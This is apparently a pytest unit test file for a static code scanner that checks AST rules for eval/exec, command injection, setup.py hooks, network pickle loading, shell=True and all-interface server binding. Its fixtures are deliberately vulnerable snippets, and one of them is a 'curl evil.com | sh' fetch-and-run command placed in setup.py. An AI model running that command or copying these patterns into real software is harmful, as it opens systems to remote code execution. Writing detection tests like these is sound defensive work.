"""Unit tests for all YAML-defined AST detection rules (no LLM calls).

Rules are loaded from rules/definitions/*.yaml via all_rules().  Tests are
grouped by rule ID and structured as:
  - positive cases — the rule fires on code it should detect
  - negative cases — the rule does NOT fire on safe code (no false positives)
"""

import ast

import pytest

from pyhunter.rules.registry import all_rules


def _parse(src: str):
    return ast.parse(src), src.splitlines()


# Build a lookup once so each test class can reference rules by ID
_RULES = {r.rule_id: r for r in all_rules()}


# ── RCE-EVAL ──────────────────────────────────────────────────────────────────

class TestRCEEval:
    rule = _RULES["RCE-EVAL"]

    def test_detects_eval(self):
        tree, lines = _parse("eval(user_input)")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "eval"

    def test_detects_exec(self):
        tree, lines = _parse("exec(code)")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "exec"

    def test_detects_compile(self):
        tree, lines = _parse("compile(src, '<string>', 'exec')")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "compile"

    def test_safe_int_conversion_no_finding(self):
        tree, lines = _parse("x = int(user_input)")
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []


# ── CMD-INJECT ────────────────────────────────────────────────────────────────

class TestCmdInject:
    rule = _RULES["CMD-INJECT"]

    def test_detects_tainted_os_system(self):
        src = """\
import os
from flask import request
def view():
    cmd = request.args.get("host")
    os.system(cmd)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert any(f.sink == "os.system" for f in findings)

    def test_detects_tainted_subprocess_shell_true(self):
        src = """\
import subprocess
from flask import request
def run():
    cmd = request.form.get("cmd")
    subprocess.run(cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1

    def test_untainted_os_system_not_flagged(self):
        src = """\
import os
def backup():
    os.system("tar -czf /tmp/backup.tar.gz /app")
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []

    def test_subprocess_without_shell_not_flagged(self):
        src = """\
import subprocess
from flask import request
def run():
    path = request.args.get("file")
    subprocess.run(["ls", path], shell=False)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []


# ── RCE-IMPORT ───────────────────────────────────────────────────────────────

class TestRCEImport:
    rule = _RULES["RCE-IMPORT"]

    def test_detects_eval_in_init(self):
        tree, lines = _parse("eval(dangerous)")
        findings = self.rule.check(tree, lines, "__init__.py")
        assert len(findings) == 1
        assert findings[0].sink == "eval"

    def test_ignores_regular_files(self):
        tree, lines = _parse("eval(dangerous)")
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_system_in_setup(self):
        tree, lines = _parse("import os\nos.system('curl evil.com | sh')")
        findings = self.rule.check(tree, lines, "setup.py")
        assert any(f.sink == "os.system" for f in findings)


# ── RCE-BUILD ─────────────────────────────────────────────────────────────────

class TestRCEBuild:
    rule = _RULES["RCE-BUILD"]

    def test_detects_cmdclass(self):
        src = "from setuptools import setup\nsetup(name='x', cmdclass={'install': MyInstall})"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "setup.py")
        assert len(findings) == 1
        assert "cmdclass" in findings[0].sink

    def test_ignores_non_setup_files(self):
        src = "setup(name='x', cmdclass={'install': MyInstall})"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "mymodule.py")
        assert findings == []

    def test_safe_setup_no_finding(self):
        src = "from setuptools import setup\nsetup(name='x', version='1.0')"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "setup.py")
        assert findings == []


# ── FLOW-WEB ──────────────────────────────────────────────────────────────────

class TestFlowWeb:
    rule = _RULES["FLOW-WEB"]

    def test_detects_request_args_to_eval(self):
        src = """\
from flask import request
def view():
    expr = request.args.get("q")
    return eval(expr)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "eval" for f in findings)
        assert any("request.args" in (f.source or "") for f in findings)

    def test_detects_request_form_to_subprocess(self):
        src = """\
import subprocess
from flask import request
def upload():
    cmd = request.form["command"]
    subprocess.run(cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("subprocess" in f.sink for f in findings)

    def test_no_finding_when_no_tainted_source(self):
        src = """\
def safe():
    cmd = "ls /tmp"
    import subprocess
    subprocess.run(cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_taint_propagates_through_assignment(self):
        src = """\
from flask import request
def view():
    raw = request.args
    user_val = raw
    return eval(user_val)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "eval" for f in findings)


# ── EXEC-DECORATOR ────────────────────────────────────────────────────────────

class TestExecDecorator:
    rule = _RULES["EXEC-DECORATOR"]

    def test_detects_eval_decorator(self):
        src = """\
@eval(user_expr)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("eval" in f.sink for f in findings)

    def test_detects_run_decorator_with_dynamic_arg(self):
        src = """\
@run(user_input)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("run" in f.sink for f in findings)

    def test_safe_route_literal_no_finding(self):
        src = """\
@app.route("/api/data")
def data():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_dynamic_route(self):
        src = """\
@app.route(user_path)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert len(findings) == 1
        assert "route" in findings[0].sink

    def test_bare_eval_decorator(self):
        src = """\
@eval
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("eval" in f.sink for f in findings)


# ── PICKLE-NET ────────────────────────────────────────────────────────────────

class TestPickleNet:
    rule = _RULES["PICKLE-NET"]

    def test_detects_pickle_loads_from_recv(self):
        src = """\
import pickle, socket
def serve():
    s = socket.socket()
    data = s.recv(4096)
    pickle.loads(data)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "server.py")
        assert any(f.sink == "pickle.loads" for f in findings)

    def test_detects_pickle_loads_from_response_content(self):
        src = """\
import pickle, requests
def fetch():
    resp = requests.get("http://internal/data")
    return pickle.loads(resp.content)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "client.py")
        assert len(findings) >= 1
        assert all(f.sink == "pickle.loads" for f in findings)

    def test_safe_pickle_from_local_file(self):
        src = """\
import pickle
def load_model():
    with open("model.pkl", "rb") as f:
        return pickle.load(f)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []


# ── AGENT-SHELL ───────────────────────────────────────────────────────────────

class TestAgentShell:
    rule = _RULES["AGENT-SHELL"]

    def test_detects_variable_command_shell_true(self):
        # hermes-agent cli.py:5035 pattern — exec_cmd from config
        src = """\
import subprocess
def run_cmd(exec_cmd):
    subprocess.run(exec_cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "cli.py")
        assert len(findings) == 1
        assert "shell=True" in findings[0].sink

    def test_detects_config_derived_command(self):
        src = """\
import subprocess
def execute(config):
    cmd = config.get("command", "")
    subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "cli.py")
        assert len(findings) == 1

    def test_detects_popen_shell_true(self):
        src = """\
import subprocess
def run_cmd(llm_output):
    proc = subprocess.Popen(llm_output, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "agent.py")
        assert len(findings) == 1
        assert "Popen" in findings[0].sink

    def test_detects_fstring_command(self):
        src = """\
import subprocess
def run(user_cmd):
    subprocess.run(f"echo {user_cmd}", shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert len(findings) == 1

    def test_literal_command_not_flagged(self):
        src = """\
import subprocess
subprocess.run("ls -la", shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "cli.py")
        assert findings == []

    def test_list_command_not_flagged(self):
        # List form with shell=True is a no-op — first element is the program
        src = """\
import subprocess
subprocess.run(["ls", "-la"], shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "cli.py")
        assert findings == []

    def test_no_shell_true_not_flagged(self):
        src = """\
import subprocess
from flask import request
def run():
    cmd = request.args.get("cmd")
    subprocess.run(["ls", cmd])
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "cli.py")
        assert findings == []


# ── RCE-EXEC-COMPILE ─────────────────────────────────────────────────────────

class TestRCEExecCompile:
    rule = _RULES["RCE-EXEC-COMPILE"]

    def test_detects_exec_compile_open_read(self):
        # Exact hermes-agent auto_jailbreak.py:52 pattern
        src = """\
exec(
    compile(
        open(_parseltongue_path).read(),
        str(_parseltongue_path),
        "exec",
    ),
    _caller_globals,
)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "auto_jailbreak.py")
        assert len(findings) == 1
        assert "exec(compile(open" in findings[0].sink

    def test_detects_inline_form(self):
        src = "exec(compile(open(path).read(), path, 'exec'))"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "loader.py")
        assert len(findings) == 1

    def test_bare_exec_not_flagged(self):
        # Bare exec is caught by RCE-EVAL; this rule is for the compound form
        src = "exec(user_code)"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_exec_compile_string_literal_not_flagged(self):
        # compile() of a string literal — no file read, not this pattern
        src = "exec(compile('x = 1', '<string>', 'exec'))"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_inside_function(self):
        src = """\
def load_skill(path):
    exec(compile(open(path).read(), path, "exec"), globals())
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "skills.py")
        assert len(findings) == 1


# ── GATEWAY-EXPOSURE ──────────────────────────────────────────────────────────

class TestGatewayExposure:
    rule = _RULES["GATEWAY-EXPOSURE"]

    def test_detects_flask_run_all_interfaces(self):
        src = """\
from flask import Flask
app = Flask(__name__)
app.run(host='0.0.0.0', port=8642)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "server.py")
        assert len(findings) == 1
        assert "0.0.0.0" in findings[0].sink

    def test_detects_uvicorn_run_all_interfaces(self):
        src = """\
import uvicorn
uvicorn.run(app, host='0.0.0.0', port=8000)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "main.py")
        assert len(findings) == 1

    def test_detects_socket_bind_all_interfaces(self):
        src = """\
import socket
s = socket.socket()
s.bind(('0.0.0.0', 8642))
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "gateway.py")
        assert len(findings) == 1
        assert "socket.bind" in findings[0].sink

    def test_detects_http_server_all_interfaces(self):
        src = """\
from http.server import HTTPServer, SimpleHTTPRequestHandler
server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "server.py")
        assert len(findings) == 1
        assert "HTTPServer" in findings[0].sink

    def test_detects_empty_host_all_interfaces(self):
        # Empty string also binds to all interfaces
        src = """\
import uvicorn
uvicorn.run(app, host='', port=8000)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "main.py")
        assert len(findings) == 1

    def test_localhost_not_flagged(self):
        src = """\
import uvicorn
uvicorn.run(app, host='127.0.0.1', port=8000)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "main.py")
        assert findings == []

    def test_flask_localhost_not_flagged(self):
        src = """\
from flask import Flask
app = Flask(__name__)
app.run(host='localhost', port=5000)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_no_host_kwarg_not_flagged(self):
        # run() without an explicit host= does not trigger the rule
        src = """\
import uvicorn
uvicorn.run(app, port=8000)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "main.py")
        assert findings == []
